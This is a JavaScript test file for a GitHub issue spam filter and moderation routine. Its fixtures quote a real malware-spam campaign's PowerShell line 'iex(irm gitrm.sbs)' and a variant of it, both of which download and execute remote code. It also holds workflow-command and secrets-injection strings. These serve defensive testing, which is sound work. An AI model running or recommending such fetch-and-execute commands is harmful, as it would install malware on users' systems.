'use strict';
const test = require('node:test');
const assert = require('node:assert/strict');
const { matchSpam, moderate } = require('./spam-filter.cjs');
const ad = {
  title: '[ALL-IN-ONE] Grand-V — GTA V in Browser • NO CRASHES',
  body: 'Optimizer + Crash Fix\nQuick Full Fix (PowerShell)\nTerminal (Admin)\n"Grand-VFullFix";iex(irm gitrm.sbs)',
};

test('matches the live campaign and case/whitespace variants', () => {
  assert.ok(matchSpam(ad));
  assert.ok(matchSpam({ ...ad, body: ad.body.toUpperCase() }));
  assert.ok(matchSpam({ ...ad, body: 'Grand-VFullFix; Invoke-Expression (Invoke-RestMethod https://sub.gitrm.sbs/fix)' }));
});

test('preserves normal reports, donation links and domain mentions', () => {
  for (const item of [
    { title: 'Performance problem', body: 'PowerShell launcher crashes. Can you optimize the game?' },
    { title: 'HIGH PRIORITY GAME BREAKING ISSUES', body: 'Invalid fixup; THREAD ERROR main' },
    { title: 'Support the project', body: 'SOL wallet and BTC wallet' },
    { title: 'Question', body: 'What is gitrm.sbs?' },
    { title: ad.title, body: 'Please do not execute this script.' },
    { title: 'AI tokens', body: '2.5 billion tokens for debugging' },
    { ...ad, body: ad.body.replace('gitrm.sbs', 'gitrm.sbs.example.org') },
    { ...ad, body: ad.body.replace('gitrm.sbs', 'not-gitrm.sbs') },
  ]) assert.equal(matchSpam(item), null, item.title);
});

test('preserves community warnings even when they quote the command', () => {
  assert.equal(matchSpam({ title: 'CITIZENS PSA: ABOUT ' + ad.title, body: ad.body }), null);
  assert.equal(matchSpam({ ...ad, body: 'DO NOT EXECUTE this malware.\n' + ad.body }), null);
});

function harness({ comment = false, target = {}, eventName, pullRequest = false } = {}) {
  const calls = [];
  const data = { ...ad, user: { login: 'spam-author', html_url: 'https://github.com/spam-author' },
    html_url: 'https://github.com/SebasKitten/Grand-V/issues/42', author_association: 'NONE',
    created_at: '2026-10-18T00:00:00Z', updated_at: '2026-10-18T00:00:01Z', ...target };
  const context = { eventName: eventName || (comment ? 'issue_comment' : 'issues'),
    repo: { owner: 'SebasKitten', repo: 'Grand-V' }, runId: 123,
    payload: { issue: { number: 42, ...(pullRequest ? { pull_request: {} } : {}) }, comment: { id: 84 } } };
  const github = { rest: { issues: {
    get: async () => { calls.push(['read']); return { data }; },
    getComment: async () => { calls.push(['read-comment']); return { data }; },
    update: async args => { calls.push(['update', args]); },
    updateComment: async args => { calls.push(['update-comment', args]); },
    lock: async args => { calls.push(['lock', args]); },
  } } };
  const core = { info: value => { calls.push(['log', value]); } };
  return { github, context, core, calls };
}

test('logs full evidence before redacting, closing and locking a spam issue', async () => {
  const h = harness();
  assert.equal((await moderate(h)).action, 'issue-redacted-closed-locked');
  assert.deepEqual(h.calls.map(c => c[0]), ['read', 'log', 'update', 'lock', 'log']);
  const evidence = JSON.parse(Buffer.from(h.calls[1][1].split('=')[1], 'base64').toString());
  assert.equal(evidence.body, ad.body);
  assert.equal(evidence.username, 'spam-author');
  assert.equal(h.calls[2][1].state, 'closed');
  assert.equal(h.calls[2][1].state_reason, 'not_planned');
  assert.equal(h.calls[3][1].lock_reason, 'spam');
});

test('redacts a spam comment without closing or locking its parent', async () => {
  const h = harness({ comment: true });
  assert.equal((await moderate(h)).action, 'comment-redacted');
  assert.deepEqual(h.calls.map(c => c[0]), ['read-comment', 'log', 'update-comment', 'log']);
  assert.equal(h.calls[2][1].comment_id, 84);
});

test('reads fresh content rather than stale webhook text', async () => {
  const h = harness({ target: { body: 'A legitimate issue after an edit' } });
  h.context.payload.issue.body = ad.body;
  assert.equal((await moderate(h)).action, 'no-match');
  assert.deepEqual(h.calls.map(c => c[0]), ['read']);
});

test('ignores pull requests and the manual self-test event', async () => {
  for (const h of [harness({ pullRequest: true }), harness({ eventName: 'workflow_dispatch' })]) {
    assert.equal((await moderate(h)).action, 'ignored-event');
    assert.equal(h.calls.length, 0);
  }
});

test('does not moderate repository owner or write-access contributors', async () => {
  for (const target of [{ user: { login: 'SebasKitten' } }, { author_association: 'COLLABORATOR' }, { author_association: 'MEMBER' }]) {
    const h = harness({ target });
    assert.equal((await moderate(h)).action, 'trusted-author');
    assert.deepEqual(h.calls.map(c => c[0]), ['read']);
  }
});

test('handles deleted targets, but surfaces permission failures', async () => {
  const h = harness();
  h.github.rest.issues.get = async () => { throw { status: 404 }; };
  assert.equal((await moderate(h)).action, 'already-removed');
  h.github.rest.issues.get = async () => { throw { status: 403 }; };
  await assert.rejects(moderate(h), error => error.status === 403);
});

test('does not relock already locked spam', async () => {
  const h = harness({ target: { locked: true } });
  await moderate(h);
  assert.equal(h.calls.some(c => c[0] === 'lock'), false);
});

test('attacker strings are logged as base64 data, never raw workflow commands', async () => {
  const h = harness({ target: { body: ad.body + '\n::error::injected\n${{ secrets.GITHUB_TOKEN }}\nrequire("fs").writeFileSync("owned", "bad")' } });
  await moderate(h);
  const log = h.calls.find(c => c[0] === 'log')[1];
  assert.match(log, /^SPAM_EVIDENCE_BASE64=[A-Za-z0-9+/=]+$/);
  assert.ok(!log.includes('::error::'));
});
